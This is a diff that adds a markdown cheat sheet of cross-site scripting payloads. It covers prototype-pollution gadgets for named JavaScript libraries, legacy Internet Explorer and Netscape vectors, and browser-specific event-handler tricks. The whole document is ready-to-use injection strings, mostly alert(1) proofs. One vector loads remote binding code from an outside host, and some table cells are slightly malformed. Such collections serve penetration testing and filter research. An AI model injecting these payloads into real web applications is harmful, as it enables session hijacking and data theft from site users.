@@ -1,0 +1,49 @@
+# Prototype Pollution and XSS Techniques
+
+## Prototype Pollution Payloads
+
+| **Library**                  | **Payload**                                                                                                            | **Author**         | **Version**       | **Fingerprint**                                                      |
+|------------------------------|------------------------------------------------------------------------------------------------------------------------|--------------------|------------------|-----------------------------------------------------------------------|
+| **Marionette.js / Backbone.js** | `<script>Object.prototype.tagName = 'img'; Object.prototype.src = ['x:x']; Object.prototype.onerror = ['alert(1)']</script><script>(function() { var View = Mn.View.extend({template: '#template-layout'}); var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}}); var app = new App(); app.start(); })();</script><div id="template-layout" type="x-template/underscore">xxx</div>` | Sergey Bobrov      |                  | `return (typeof Marionette !== 'undefined') return (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined')` |
+| **Adobe Dynamic Tag Management** | `<script>Object.prototype.src='data:,alert(1)//'</script>`                                                            | Sergey Bobrov      |                  | `return (typeof _satellite !== 'undefined')`                         |
+| **Embedly Cards**            | `<script>Object.prototype.onload = 'alert(1)'</script>`                                                                | Guilherme Keerok   |                  | `return (typeof window.embedly !== 'undefined')`                     |
+| **Segment Analytics.js**     | `<script>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']</script>`            | Sergey Bobrov      |                  | `return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined')` |
+| **Knockout.js**              | `<strong data-bind="text:'hello'"></strong><script>Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';</script><script>ko.applyBindings({})</script>` | Michał Bentkowski |                  |                                                                       |
+
+## Classic XSS Vectors
+
+| **Technique**                           | **Example**                                                                                              | **Notes**                      |
+|-----------------------------------------|----------------------------------------------------------------------------------------------------------|--------------------------------|
+| **Image src with JavaScript protocol**  | `<img src="javascript:alert(1)">`                                                                       |                                |
+| **Body background with JavaScript protocol** | `<body background="javascript:alert(1)">`                                                             |                                |
+| **Iframe data urls**                    | `<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">`                              | Modern browsers may nullify origin |
+| **VBScript protocol (IE)**              | `<a href="vbscript:MsgBox+1">XSS</a>` <a href="#" onclick="vbs:Msgbox+1">XSS</a>`                       | Works in older IE versions      |
+| **JScript compact (IE)**                | `<a href="#" onclick="jscript.compact:alert(1);">test</a>`                                             |                                |
+| **JScript.Encode (IE)**                 | `<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>`               |                                |
+| **VBScript.Encoded**                   | `<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>` |                                |
+| **JavaScript entities (Netscape)**     | `<a title="&{alert(1)}">XSS</a>`                                                                       |                                |
+| **JavaScript stylesheets (Netscape)**  | `<link href="xss.js" rel=stylesheet type="text/javascript">`                                          |                                |
+| **Button consuming markup**             | `<form><button name=x formaction=x><b>stealme</b></form>`                                              |                                |
+| **IE9 select elements and plaintext**   | `<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>` |                                |
+| **XBL Firefox <= 2**                    | `<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">`                             |                                |
+| **XBL Firefox 3.5**                    | `<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />` |                                |
+| **CSS expressions <= IE7**              | `<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)>`                           |                                |
+| **Quirks mode IE**                     | `<div style=xss=expression(alert(1))> <div style="color&#x3dred">test</div>`                             |                                |
+| **Behaviors for older IE modes**        | `<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>`                   |                                |
+| **Older IE event handlers in functions** | `<script> function window.onload(){ alert(1); } </script>` <script> function window::onload(){ alert(1); } </script>` |                                |
+| **GreyMagic HTML+time exploit**         | `<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>` |                                |
+
+## XSS Techniques by Browser
+
+| **Browser**    | **Technique**                        | **Example**                                                                                 | **Notes**                      |
+|----------------|--------------------------------------|---------------------------------------------------------------------------------------------|--------------------------------|
+| **Firefox**    | **Allowing NULLs after &**            | `<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>`                                |                                |
+| **Firefox**    | **NULLs inside named entities**      | `<a href="javascript&colon;alert(1)">Firefox</a>`                                        |                                |
+| **Firefox**    | **NULLs inside comments**            | `<!-- ><img title="--><iframe/onload=alert(1)>"> -->`                                      |                                |
+| **Safari**     | **onload event inside SVG**          | `<svg><xss onload=alert(1)>`                                                                |                                |
+| **Chrome**     | **discard tag and onbegin**          | `<svg><discard onbegin=alert(1)>`                                                          |                                |
+| **Firefox**    | **onloadstart event for media**      | `<img src=validimage.png onloadstart=alert(1)>`                                            |                                |
+| **Firefox**    | **onloadend event for media**        | `<input type=image onloadend=alert(1) src=validimage.png>`                                 |                                |
+| **Firefox**    | **onbounce event for marquee**       | `<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>`                                  |                                |
+| **Firefox**    | **onfinish event for marquee**       | `<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>`                                  |                                |
+| **Firefox**    | **onstart event for marquee**        | `<marquee onstart=alert(1)>XSS</marquee>`                                                   |                                |
